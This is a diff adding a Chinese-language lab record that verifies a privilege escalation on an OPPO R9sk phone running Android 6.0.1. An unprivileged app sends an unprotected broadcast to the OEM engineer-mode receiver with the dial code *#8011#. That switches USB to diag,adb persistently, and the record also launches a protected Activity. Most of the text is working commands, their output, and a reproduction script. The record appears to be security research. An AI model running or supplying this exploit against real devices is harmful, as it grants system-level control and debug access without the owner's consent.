@@ -1,0 +1,128 @@
+# 工程模式未授权广播 —— 实机验证记录
+# 设备：OPPO R9sk / R9sk_11_A.37_191127 / Android 6.0.1 (API 23)
+# 时间：2026-11-21 15:5x - 16:0x CST
+# 连接：PC → ssh r9sk（192.168.2.205:8022，u0_a87，uid 10087）
+
+## 0. 身份确认
+
+$ ssh r9sk 'getprop ro.product.model; getprop ro.build.version.sdk; id'
+OPPO R9sk
+23
+uid=10087(u0_a87) gid=10087(u0_a87) groups=10087(u0_a87),3003(inet),9997(everybody),50087(all_a87),99909997(u999_everybody)
+
+SELinux 域（同一会话早前采集）：
+u:r:untrusted_app:s0:c512,c768
+
+结论：调用者是普通第三方 App，没有任何特殊权限。
+
+---
+
+## 1. 第一次尝试（失败，记录原因）
+
+$ ssh r9sk '/system/bin/am broadcast -a com.oppo.engineermode.EngineerModeMain --es order TEST'
+/system/bin/am[8]: app_process: not found
+
+原因：Termux 的 PATH 不含 /system/bin。
+
+---
+
+## 2. 第二次尝试（失败，记录原因）
+
+$ ssh r9sk 'export PATH=/system/bin:$PATH; am broadcast -a com.oppo.engineermode.EngineerModeMain --es order TEST'
+Broadcasting: Intent { act=com.oppo.engineermode.EngineerModeMain (has extras) }
+java.lang.SecurityException: Permission Denial: broadcast asks to run as user -2 but is calling from user 0;
+this requires android.permission.INTERACT_ACROSS_USERS_FULL or android.permission.INTERACT_ACROSS_USERS
+
+原因：Android 6 的 am 默认 --user current（-2），普通 App 无权跨用户。加 --user 0 即可。
+
+---
+
+## 3. 成功发送
+
+$ ssh r9sk 'export PATH=/system/bin:$PATH; am broadcast --user 0 -a com.oppo.engineermode.EngineerModeMain --es order TEST'
+Broadcasting: Intent { act=com.oppo.engineermode.EngineerModeMain (has extras) }
+Broadcast completed: result=0
+
+（order=TEST 不匹配任何暗码，接收器只打日志后返回，不产生副作用。）
+
+---
+
+## 4. 关键测试：order = *#8011#
+
+### 4.1 执行前
+
+$ for p in persist.sys.usb.config persist.sys.allcommode persist.sys.oppo.usbactive persist.sys.adb.engineermode sys.usb.config sys.usb.state; do
+    printf "%s=%s\n" "$p" "$(getprop $p)"; done
+
+persist.sys.usb.config=mtp
+persist.sys.allcommode=
+persist.sys.oppo.usbactive=
+persist.sys.adb.engineermode=
+sys.usb.config=mtp,mass_storage
+sys.usb.state=mtp,mass_storage
+
+### 4.2 发送广播
+
+$ am broadcast --user 0 -a com.oppo.engineermode.EngineerModeMain --es order "*#8011#"
+Broadcasting: Intent { act=com.oppo.engineermode.EngineerModeMain (has extras) }
+Broadcast completed: result=0
+
+### 4.3 执行后（约 3 秒）
+
+persist.sys.usb.config=diag,adb
+persist.sys.allcommode=true
+persist.sys.oppo.usbactive=true
+persist.sys.adb.engineermode=0
+sys.usb.config=diag,adb
+sys.usb.state=diag,adb
+
+### 4.4 判定
+
+SystemProperties.set("persist.*") 需要 system uid；
+调用者是 uid 10087 的普通 App，属性却被改写
+→ 代码确实在 com.oppo.engineermode 进程（android.uid.system）里执行
+→ 未授权广播导致的 App → system uid 提权成立。
+
+---
+
+## 5. 旁证：拉起受保护 Activity
+
+$ am broadcast --user 0 -a com.oppo.engineermode.EngineerModeMain --es order "*#36446337#"   # EngineeringMode 主页
+Broadcasting: Intent { act=com.oppo.engineermode.EngineerModeMain (has extras) }
+Broadcast completed: result=0
+
+随后 events 日志：
+
+11-21 16:07:41.719  4219  4219 I am_on_paused_called: [0,com.termux.app.TermuxActivity]
+
+Termux 被切到后台，说明有 Activity 被 system 进程拉起。
+（受限于 logcat 的 uid 过滤，无法直接看到 system_app 的 am_create_activity 事件。）
+
+---
+
+## 6. 副作用
+
+设备 USB 配置被持久改为 diag,adb，adb_enabled 被置 1。
+重启后仍然有效。
+恢复 MTP：设置 → 开发者选项 → 选择 USB 配置 → MTP。
+
+从项目角度：数据线修好后 adb 会自动可用，反而有利。
+
+---
+
+## 7. 复现脚本
+
+```bash
+ssh r9sk 'export PATH=/system/bin:$PATH; \
+  am broadcast --user 0 \
+    -a com.oppo.engineermode.EngineerModeMain \
+    --es order "*#8011#"'
+ssh r9sk 'getprop persist.sys.usb.config'   # 期望 diag,adb
+```
+
+## 8. 相关文件
+
+- evidence/2026-11-21-oem-manifest.txt        组件与权限
+- evidence/2026-11-21-engineermode-actions.txt 暗码映射表
+- work/oem_smali/com/oppo/engineermode/EngineerModeActionReceiver.smali  反编译代码
+- work/oem_smali/com/oppo/engineermode/wifitest/WifiFTMActivity.smali    ctl.start 唯一使用点
